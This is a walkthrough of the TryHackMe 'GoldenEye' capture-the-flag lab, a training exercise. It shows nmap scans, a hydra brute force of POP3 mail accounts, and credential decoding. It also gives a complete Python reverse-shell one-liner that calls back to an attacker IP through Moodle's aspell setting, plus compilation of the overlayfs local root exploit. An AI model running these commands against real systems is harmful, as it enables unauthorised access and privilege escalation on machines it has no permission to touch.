---
title: GoldenEye
published: true
tags: [hydra, nmap, email, enumeration]
---

<https://tryhackme.com/room/goldeneye> Bond, James Bond. A guided CTF.

<img src="/assets/tumblr_nbnjulmxcW1tpfnxwo4_500.gif" alt="Goldeneye">

Using nmap to scan the network for all ports: `nmap -p-`, followed up by `nmap -sC -sV -sT -O -p25,80,55006,55007 goldeneye.thm`

```
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES UIDL USER CAPA PIPELINING SASL(PLAIN) TOP
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: STLS AUTH-RESP-CODE PIPELINING SASL(PLAIN) TOP RESP-CODES UIDL USER CAPA
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

Check the webserver on port 80. Viewing the sourcecode we can find a HTML encoded passphrase

```
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

`boris:InvincibleHack3r` are the login creds for this part of the site. we can login with these @ `/sev-home/`

Viewing the source of this gives us another user - `natalya`

We can use this username with hydra and rockyou to penetrate the SMTP server on port 25. Nevermind AUTH is disabled on the port 25, lets try the higher port pop3 servers. 

**I spent hours trying with rockyou to get anything but its too slow so i found fasttrack.txt works as an alternative**

- `hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://goldeneye.thm:55007` gives us natalyas email pass `natalya:bird`. Using the same we also find boris' `boris:secret1!`

We can login to the pop3 email server

1. `telnet goldeneye.thm 55007`
2. `USER boris`
3. `PASS secret1!`
4. check messages with `STAT` this command fives us the amount of messages and the size of the inbox
5. `LIST` will list all emails. Looks like we have 3 of them to check out. We can retrieve each message with `RETR`

- boris email 1

```
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
```

- boris email 2

```
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
```

- boris email 3

```
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

Lets quit and then check out natalya's. `LIST` shows us she has 2 messages.

- natalya email 1

```
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
```

- natalya email 2

```
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

- `sudo nano /etc/hosts` and navigate to `http://severnaya-station.com/gnocertdir` where we can login with `xenia`

Checking around the site inside of xenias profile she has an undread message from `doak`

Using the same process as before with hydra we can get doaks email password `doak:goat`. He has one message in his inbox.

```
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

Lokking into doaks profile and checking his files we find a secret message that points to `/dir007key/for-007.jpg`. Grab that file and use `exiftool` These are the admin creds

We can decode with `echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d` which gives us `admin:xWinter1995x!`

Login to user. So there is a vulnerability within aspell which we can use python to call for a reverse shell when a user uses the spellcheck feature ont he tinyMCE editor. Searching in the settings for `aspell` brings up the Path to aspell which we can edit with to send us a shell. `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.3.64",6676));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

After setting up a `rlwrap` we can goto the site blogs and try to add a new entry and then use spellcheck to get a reverse shell on the system.

Must remember to modify the spell engine as well to PSpellShell

After getting reverse shell upgrade shell a bit

1. python3 -c "import pty;pty.spawn('/bin/bash')"
2. Press 'Ctrl' + 'Z' to background the program.
3. stty raw -echo
4. fg
5. export TERM=xterm-256color

Download linpeas onto the system and run for enumeration of the system.

We have a vulnerable linux kernal 3.13.0-32-generic. Which means this sustemis vvulnerable to the overlayfs exploit. 

I have exploited this a few times before so this time I am going to see if I can use metasploit to get a root shell. Shouldn't be an issue I don't think. Well it was. GCC is not installed so metasploit is unable to complete the exploit. Back in the syustem get the ofs.c to the target. replace `gcc` with `cc` in the exploit `sed -i "s/gcc/cc/g" 37292.c`. then compile with `cc`. `cc ofs.c -o ofs` and run the exploit with `./ofs` and we win.

